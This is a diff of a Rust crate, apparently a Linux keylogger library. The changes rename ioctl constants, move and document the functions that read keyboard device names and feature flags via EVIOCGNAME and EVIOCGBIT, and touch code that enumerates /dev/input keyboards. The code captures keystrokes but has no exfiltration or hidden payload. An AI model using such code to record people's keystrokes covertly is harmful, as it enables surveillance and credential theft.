@@ -7,15 +7,16 @@ use std::os::fd::{AsRawFd, RawFd};
 use std::os::unix::fs::FileTypeExt;
 use std::path::PathBuf;
 
-const _IOC_NRBITS: libc::c_ulong = 8;
-const _IOC_TYPEBITS: libc::c_ulong = 8;
-const _IOC_SIZEBITS: libc::c_ulong = 14;
-const _IOC_NRSHIFT: libc::c_ulong = 0;
-const _IOC_TYPESHIFT: libc::c_ulong = _IOC_NRSHIFT + _IOC_NRBITS;
-const _IOC_SIZESHIFT: libc::c_ulong = _IOC_TYPESHIFT + _IOC_TYPEBITS;
-const _IOC_DIRSHIFT: libc::c_ulong = _IOC_SIZESHIFT + _IOC_SIZEBITS;
-const _IOC_READ: libc::c_ulong = 2;
+const IOC_NRBITS: libc::c_ulong = 8;
+const IOC_TYPEBITS: libc::c_ulong = 8;
+const IOC_SIZEBITS: libc::c_ulong = 14;
+const IOC_NRSHIFT: libc::c_ulong = 0;
+const IOC_TYPESHIFT: libc::c_ulong = IOC_NRSHIFT + IOC_NRBITS;
+const IOC_SIZESHIFT: libc::c_ulong = IOC_TYPESHIFT + IOC_TYPEBITS;
+const IOC_DIRSHIFT: libc::c_ulong = IOC_SIZESHIFT + IOC_SIZEBITS;
+const IOC_READ: libc::c_ulong = 2;
 
+/// Read [`libc::input_event`s](libc::input_event) from the specified file descriptor.
 pub(crate) fn read_key_events(fd: RawFd) -> io::Result<Vec<KeyEvent>> {
     const MAX_INPUT_EV: usize = 128;
 
@@ -48,42 +49,6 @@ pub(crate) fn find_keyboard_devices() -> KeyloggerResult<impl Iterator<Item = Ke
     Ok(find_char_devices()?.filter_map(|entry| Keyboard::try_from(entry).ok()))
 }
 
-pub(crate) fn read_name(f: &File) -> KeyloggerResult<String> {
-    const DEVICE_NAME_MAX_LEN: usize = 512;
-
-    let mut device_name = [0u8; DEVICE_NAME_MAX_LEN];
-
-    let eviocgname = (_IOC_READ << _IOC_DIRSHIFT)
-        | (('E' as libc::c_ulong) << _IOC_TYPESHIFT)
-        | (0x06 << _IOC_NRSHIFT)
-        | ((device_name.len() as libc::c_ulong) << _IOC_SIZESHIFT);
-
-    ioctl(
-        f.as_raw_fd(),
-        eviocgname,
-        device_name.as_mut_ptr() as *mut libc::c_ulong,
-    )?;
-
-    Ok(String::from_utf8_lossy(&device_name).into())
-}
-
-pub(crate) fn read_event_flags(f: &File) -> KeyloggerResult<libc::c_ulong> {
-    let mut ev_flags: libc::c_ulong = 0;
-
-    let eviocgbit = (_IOC_READ << _IOC_DIRSHIFT)
-        | (('E' as libc::c_ulong) << _IOC_TYPESHIFT)
-        | (0x20 << _IOC_NRSHIFT)
-        | (((std::mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << _IOC_SIZESHIFT);
-
-    ioctl(
-        f.as_raw_fd(),
-        eviocgbit,
-        (&mut ev_flags) as *mut libc::c_ulong,
-    )?;
-
-    Ok(ev_flags)
-}
-
 /// Set the `O_NONBLOCK` flag for the specified file descriptor.
 pub(crate) fn set_nonblocking(f: &File) -> KeyloggerResult<()> {
     let res = unsafe { libc::fcntl(f.as_raw_fd(), libc::F_SETFL, libc::O_NONBLOCK) };
@@ -95,6 +60,45 @@ pub(crate) fn set_nonblocking(f: &File) -> KeyloggerResult<()> {
     Ok(())
 }
 
+/// Read the name of the specified keyboard device using the `EVIOCGNAME` ioctl.
+pub(crate) fn read_name(f: &File) -> KeyloggerResult<String> {
+    const DEVICE_NAME_MAX_LEN: usize = 512;
+
+    let mut device_name = [0u8; DEVICE_NAME_MAX_LEN];
+
+    let eviocgname = (IOC_READ << IOC_DIRSHIFT)
+        | (('E' as libc::c_ulong) << IOC_TYPESHIFT)
+        | (0x06 << IOC_NRSHIFT)
+        | ((device_name.len() as libc::c_ulong) << IOC_SIZESHIFT);
+
+    ioctl(
+        f.as_raw_fd(),
+        eviocgname,
+        device_name.as_mut_ptr() as *mut libc::c_ulong,
+    )?;
+
+    Ok(String::from_utf8_lossy(&device_name).into())
+}
+
+/// Read the features supported by the specified device using the `EVIOCGBIT` ioctl.
+pub(crate) fn read_event_flags(f: &File) -> KeyloggerResult<libc::c_ulong> {
+    let mut ev_flags: libc::c_ulong = 0;
+
+    let eviocgbit = (IOC_READ << IOC_DIRSHIFT)
+        | (('E' as libc::c_ulong) << IOC_TYPESHIFT)
+        | (0x20 << IOC_NRSHIFT)
+        | (((std::mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << IOC_SIZESHIFT);
+
+    ioctl(
+        f.as_raw_fd(),
+        eviocgbit,
+        (&mut ev_flags) as *mut libc::c_ulong,
+    )?;
+
+    Ok(ev_flags)
+}
+
+/// Get all character devices from `/dev/input`.
 fn find_char_devices() -> KeyloggerResult<impl Iterator<Item = PathBuf>> {
     const INPUT_DIR: &str = "/dev/input";
 
